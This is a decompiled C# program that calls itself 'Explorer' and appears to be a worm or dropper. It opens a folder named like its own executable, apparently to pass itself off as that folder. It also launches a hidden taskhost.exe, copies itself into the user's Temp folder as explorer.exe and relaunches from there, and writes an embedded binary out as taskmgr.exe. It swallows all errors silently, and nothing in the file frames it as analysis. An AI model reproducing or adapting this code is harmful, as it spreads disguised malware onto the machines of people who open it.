using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Explorer.Properties;

namespace Explorer;

internal static class Class1
{
	private static string string_0 = "{12000066-2012-4e32-1215-d0e81f1b1681}";

	private static Mutex mutex_0 = new Mutex(initiallyOwned: true, string_0);

	private static string string_1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp";

	[STAThread]
	private static void Main()
	{
		smethod_1();
		if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\taskhost.exe"))
		{
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\taskhost.exe");
		}
		if (!mutex_0.WaitOne(TimeSpan.Zero, exitContext: true) || File.Exists(string_1 + "\\~~~~~~~~~m1.4.big"))
		{
			return;
		}
		smethod_0();
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp";
		string directoryName = Path.GetDirectoryName(Application.get_ExecutablePath());
		string destFileName = string_1 + "\\explorer.exe";
		string executablePath = Application.get_ExecutablePath();
		bool flag = true;
		if (!(text.ToLower() != directoryName.ToLower()))
		{
			try
			{
				File.Delete(directoryName + "\\taskmgr.exe");
				File.WriteAllBytes(directoryName + "\\taskmgr.exe", Resources.taskmgr);
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				File.Copy(executablePath, destFileName, overwrite: true);
				Thread.Sleep(100);
				Process.Start(string_1 + "\\explorer.exe");
				Application.Exit();
				flag = false;
			}
			catch
			{
			}
		}
		if (flag)
		{
			Application.EnableVisualStyles();
			Application.SetCompatibleTextRenderingDefault(false);
			Application.Run((Form)(object)new Form1());
		}
		mutex_0.ReleaseMutex();
	}

	private static void smethod_0()
	{
		try
		{
			float[] array = new float[4] { 1f, 1.1f, 1.2f, 1.3f };
			float[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				float num = array2[i];
				if (!File.Exists(string_1 + "\\Ex" + num + ".big"))
				{
					File.WriteAllText(string_1 + "\\Ex" + num + ".big", "ex");
					Thread.Sleep(2000);
				}
			}
			if (!File.Exists(string_1 + "\\~~~~~~~~~m.big"))
			{
				File.WriteAllText(string_1 + "\\~~~~~~~~~m.big", "ex");
			}
			if (!File.Exists(string_1 + "\\~~~~~~~~~m1.1.big"))
			{
				File.WriteAllText(string_1 + "\\~~~~~~~~~m1.1.big", "ex");
			}
			if (!File.Exists(string_1 + "\\~~~~~~~~~m1.2.big"))
			{
				File.WriteAllText(string_1 + "\\~~~~~~~~~m1.2.big", "ex");
			}
		}
		catch
		{
		}
	}

	private static void smethod_1()
	{
		string executablePath = Application.get_ExecutablePath();
		string fullPath = Path.GetFullPath(executablePath);
		fullPath = fullPath.Substring(0, fullPath.Length - 4) + "\\";
		try
		{
			if (Directory.Exists(fullPath) && Directory.Exists(fullPath))
			{
				try
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = fullPath;
					processStartInfo.UseShellExecute = true;
					processStartInfo.Verb = "open";
					Process.Start(processStartInfo);
					return;
				}
				catch
				{
					Process.Start(fullPath);
					return;
				}
			}
		}
		catch
		{
		}
	}
}
